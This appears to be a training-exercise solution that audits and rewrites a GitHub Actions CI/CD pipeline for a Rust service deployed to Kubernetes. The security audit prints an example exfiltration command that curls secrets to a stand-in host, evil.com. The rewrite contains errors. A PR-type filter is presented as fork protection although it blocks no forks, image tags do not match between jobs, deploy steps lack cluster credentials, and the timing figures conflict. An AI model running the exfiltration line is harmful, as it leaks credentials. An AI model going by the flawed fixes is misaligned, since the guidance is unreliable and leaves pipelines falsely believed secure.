# Solution 04: Fix the Production Pipeline

## Part A: Security Audit

### Vulnerability 1: Kubeconfig Written to Disk

```yaml
echo "$KUBECONFIG_DATA" | base64 -d > /tmp/kubeconfig
```

The kubeconfig is decoded and written to a temporary file. If the job fails
before the `rm` command, the file persists on the runner. GitHub Actions
runners are ephemeral, but in self-hosted runners, this file could be
accessed by subsequent jobs. The kubeconfig grants full cluster access.

**Risk:** Cluster credentials leaked on runner filesystem.

### Vulnerability 2: Docker Password via stdin in Logs

```yaml
echo "${{ secrets.DOCKER_PASSWORD }}" | docker login -u "${{ secrets.DOCKER_USERNAME }}" --password-stdin
```

If the `docker login` command fails, the error message might include the
password in the logs. GitHub Actions masks secrets in logs, but the masking
is not foolproof -- truncated or encoded values can slip through.

**Risk:** Docker registry credentials exposed in CI logs.

### Vulnerability 3: No Fork Protection

```yaml
on: [push, pull_request]
```

Pull requests from forks have access to the workflow file. A malicious
contributor could modify the workflow to exfiltrate secrets by adding a
step like `curl https://evil.com/?secret=${{ secrets.KUBECONFIG }}`.

**Risk:** Secrets exfiltrated via malicious PR from a fork.

### Vulnerability 4: Secrets in Environment Variables

```yaml
env:
  KUBECONFIG_DATA: ${{ secrets.KUBECONFIG }}
```

Setting secrets as top-level environment variables makes them available to
every step, including steps that do not need them. A third-party action
could read the environment and exfiltrate the kubeconfig.

**Risk:** Overly broad secret exposure to all pipeline steps.

### Vulnerability 5: No Image Signing or Verification

The pipeline pushes images without signing them. Anyone with registry
credentials could push a malicious image, and the deployment would accept
it without verification.

**Risk:** Unsigned images could be tampered with.

### Vulnerability 6: No Container Image Scanning

The Docker image is pushed without scanning for OS-level vulnerabilities
in the base image or installed packages.

**Risk:** Known CVEs in base image shipped to production.

## Part B: Performance Audit

### Bottleneck 1: Sequential Execution (Est. 10 min wasted)

All steps run in one job: build (3 min), test (3 min), lint (2 min),
Docker build (4 min), deploy (2 min) = 14 min sequential. If test, lint,
and Docker build ran in parallel after the initial build, wall-clock time
would be ~7 min.

### Bottleneck 2: No Dependency Caching (Est. 3-5 min wasted)

Every run downloads and compiles all Cargo dependencies from scratch.
Caching `~/.cargo/registry`, `~/.cargo/git`, and `target/` based on
`Cargo.lock` hash would save 3-5 minutes on dependency resolution and
compilation.

### Bottleneck 3: Installing System Packages Every Run (Est. 30 sec wasted)

```yaml
apt-get update && apt-get install -y postgresql-client curl
```

This runs on every pipeline execution. Use a custom Docker image with
pre-installed tools, or use service containers instead of host-level
PostgreSQL.

### Bottleneck 4: No Docker Layer Caching (Est. 2-3 min wasted)

`docker build` rebuilds all layers from scratch every time. Using
`cache-from: type=gha` with `cache-to: type=gha,mode=max` would reuse
unchanged layers and save 2-3 minutes.

## Part C: Reliability Audit

### Issue 1: No Database Service Container

The tests expect PostgreSQL at `localhost:5432` but there is no service
container or database setup step. The tests rely on a PostgreSQL instance
that happens to be installed on the runner, which is not guaranteed.

**Fix:** Use the `services` key to start a PostgreSQL container with
health checks.

### Issue 2: No Rollback on Failed Deployment

```yaml
kubectl set image deployment/myapp myapp=$IMAGE:latest
kubectl rollout status deployment/myapp --timeout=60s
```

If the rollout fails, the pipeline fails but the broken deployment remains.
There is no step to revert to the previous image. The 60-second timeout
is also too short for services with slow startup.

**Fix:** Capture the current image before deploying. Add a rollback step
that runs `if: failure()`. Increase the timeout to 120-300 seconds.

### Issue 3: No Deployment Verification

The pipeline checks `rollout status` but does not verify the application
is actually healthy. A deployment can "succeed" (pods are running) while
the application is crashing on startup.

**Fix:** Add a health check step that curls the `/health` endpoint after
the rollout completes.

### Issue 4: No Retry for Flaky Operations

Network calls (Docker push, kubectl apply) can fail transiently. Without
retries, a single network hiccup fails the entire pipeline.

**Fix:** Add retry logic for network-dependent steps.

## Part D: Rewrite the Pipeline

```yaml
name: CI/CD

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
    # SECURITY: Only run on internal PRs, not forks
    types: [opened, synchronize]

env:
  REGISTRY: ghcr.io
  IMAGE: ghcr.io/${{ github.repository }}

jobs:
  # ──────────────────────────────────────────────
  # STAGE 1: BUILD
  # ──────────────────────────────────────────────
  build:
    runs-on: ubuntu-latest
    outputs:
      image-tag: ${{ steps.meta.outputs.tags }}
    steps:
      - uses: actions/checkout@v4

      - uses: actions-rust-lang/setup-rust-toolchain@v1

      - name: Cache Cargo dependencies
        uses: actions/cache@v4
        with:
          path: |
            ~/.cargo/registry
            ~/.cargo/git
            target
          key: ${{ runner.os }}-cargo-${{ hashFiles('**/Cargo.lock') }}

      - name: Build
        run: cargo build --release

      - name: Setup Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Login to GHCR
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Extract metadata
        id: meta
        uses: docker/metadata-action@v5
        with:
          images: ${{ env.REGISTRY }}/${{ github.repository }}
          tags: |
            type=sha,prefix=

      - name: Build and push image
        uses: docker/build-push-action@v5
        with:
          context: .
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

  # ──────────────────────────────────────────────
  # STAGE 2: TEST (parallel)
  # ──────────────────────────────────────────────
  unit-tests:
    runs-on: ubuntu-latest
    needs: build
    steps:
      - uses: actions/checkout@v4
      - uses: actions-rust-lang/setup-rust-toolchain@v1
      - name: Restore cache
        uses: actions/cache@v4
        with:
          path: |
            ~/.cargo/registry
            ~/.cargo/git
            target
          key: ${{ runner.os }}-cargo-${{ hashFiles('**/Cargo.lock') }}
      - name: Run unit tests
        run: cargo test --lib

  integration-tests:
    runs-on: ubuntu-latest
    needs: build
    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_PASSWORD: test
          POSTGRES_DB: testdb
        ports:
          - 5432:5432
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
    steps:
      - uses: actions/checkout@v4
      - uses: actions-rust-lang/setup-rust-toolchain@v1
      - name: Restore cache
        uses: actions/cache@v4
        with:
          path: |
            ~/.cargo/registry
            ~/.cargo/git
            target
          key: ${{ runner.os }}-cargo-${{ hashFiles('**/Cargo.lock') }}
      - name: Run integration tests
        run: cargo test --test integration
        env:
          DATABASE_URL: postgres://postgres:test@localhost:5432/testdb

  lint:
    runs-on: ubuntu-latest
    needs: build
    steps:
      - uses: actions/checkout@v4
      - uses: actions-rust-lang/setup-rust-toolchain@v1
      - name: Restore cache
        uses: actions/cache@v4
        with:
          path: |
            ~/.cargo/registry
            ~/.cargo/git
            target
          key: ${{ runner.os }}-cargo-${{ hashFiles('**/Cargo.lock') }}
      - name: Run clippy
        run: cargo clippy -- -D warnings

  dependency-scan:
    runs-on: ubuntu-latest
    needs: build
    steps:
      - uses: actions/checkout@v4
      - name: Install cargo-audit
        run: cargo install cargo-audit
      - name: Run audit
        run: cargo audit

  container-scan:
    runs-on: ubuntu-latest
    needs: build
    steps:
      - name: Scan image with Trivy
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: ${{ env.REGISTRY }}/${{ github.repository }}:${{ github.sha }}
          format: table
          exit-code: 1
          severity: CRITICAL,HIGH

  # ──────────────────────────────────────────────
  # STAGE 3: QUALITY GATE
  # ──────────────────────────────────────────────
  quality-gate:
    runs-on: ubuntu-latest
    needs: [unit-tests, integration-tests, lint, dependency-scan, container-scan]
    steps:
      - name: All checks passed
        run: echo "All quality gates passed"

  # ──────────────────────────────────────────────
  # STAGE 4: DEPLOY
  # ──────────────────────────────────────────────
  deploy-staging:
    runs-on: ubuntu-latest
    needs: quality-gate
    if: github.ref == 'refs/heads/main'
    environment: staging
    steps:
      - name: Capture current image
        id: current
        run: |
          CURRENT=$(kubectl get deployment/myapp -o jsonpath='{.spec.template.spec.containers[0].image}' 2>/dev/null || echo "none")
          echo "image=$CURRENT" >> "$GITHUB_OUTPUT"

      - name: Deploy to staging
        run: |
          kubectl set image deployment/myapp \
            myapp=${{ env.REGISTRY }}/${{ github.repository }}:${{ github.sha }}
          kubectl rollout status deployment/myapp --timeout=180s

      - name: Verify health
        run: |
          for i in $(seq 1 10); do
            if curl -sf https://staging.example.com/health; then
              echo "Health check passed"
              exit 0
            fi
            sleep 5
          done
          echo "Health check failed"
          exit 1

      - name: Rollback on failure
        if: failure()
        run: |
          if [ "${{ steps.current.outputs.image }}" != "none" ]; then
            kubectl set image deployment/myapp \
              myapp=${{ steps.current.outputs.image }}
            kubectl rollout status deployment/myapp --timeout=180s
          fi

  deploy-production:
    runs-on: ubuntu-latest
    needs: deploy-staging
    if: github.ref == 'refs/heads/main'
    environment: production
    steps:
      - name: Capture current image
        id: current
        run: |
          CURRENT=$(kubectl get deployment/myapp -o jsonpath='{.spec.template.spec.containers[0].image}')
          echo "image=$CURRENT" >> "$GITHUB_OUTPUT"

      - name: Deploy to production
        run: |
          kubectl set image deployment/myapp \
            myapp=${{ env.REGISTRY }}/${{ github.repository }}:${{ github.sha }}
          kubectl rollout status deployment/myapp --timeout=300s

      - name: Verify health
        run: |
          for i in $(seq 1 10); do
            if curl -sf https://api.example.com/health; then
              echo "Health check passed"
              exit 0
            fi
            sleep 5
          done
          echo "Health check failed"
          exit 1

      - name: Rollback on failure
        if: failure()
        run: |
          kubectl set image deployment/myapp \
            myapp=${{ steps.current.outputs.image }}
          kubectl rollout status deployment/myapp --timeout=180s
```

### Key Improvements

1. **Security:** Uses `GITHUB_TOKEN` instead of Docker username/password.
   Secrets are scoped to specific steps, not global environment variables.
   Fork PRs are restricted.

2. **Performance:** Five parallel jobs after build (unit tests, integration
   tests, lint, dependency scan, container scan). Cargo and Docker layer
   caching reduce build time from 18 minutes to under 8 minutes.

3. **Reliability:** PostgreSQL service container with health checks.
   Automatic rollback on failed deployment. Health check verification
   after deployment. 180-second timeout instead of 60.

4. **Tagging:** Images are tagged with `${{ github.sha }}`, not `latest`.
   Every deployment is traceable to a specific commit.

## Common Mistakes to Avoid

- **Using `latest` tag for production images.** This makes rollback
  impossible because you cannot identify the previous version.
- **Writing secrets to disk.** Use environment variables or GitHub's
  built-in secret masking. Never write secrets to files.
- **No rollback on failed deployment.** A failed `rollout status` means
  the new version is broken. Without automatic rollback, the broken
  version stays deployed.
- **Monolithic jobs.** A single job that does everything sequentially
  wastes time and provides no parallelism. Split into independent jobs
  with a quality gate.

## Key Takeaway

A production pipeline must be secure (protect secrets, scan for
vulnerabilities), fast (parallel stages, caching), and reliable (health
checks, automatic rollback). These three properties are not optional
extras -- they are the difference between a pipeline that works in a demo
and one that works at 3 AM when something goes wrong.
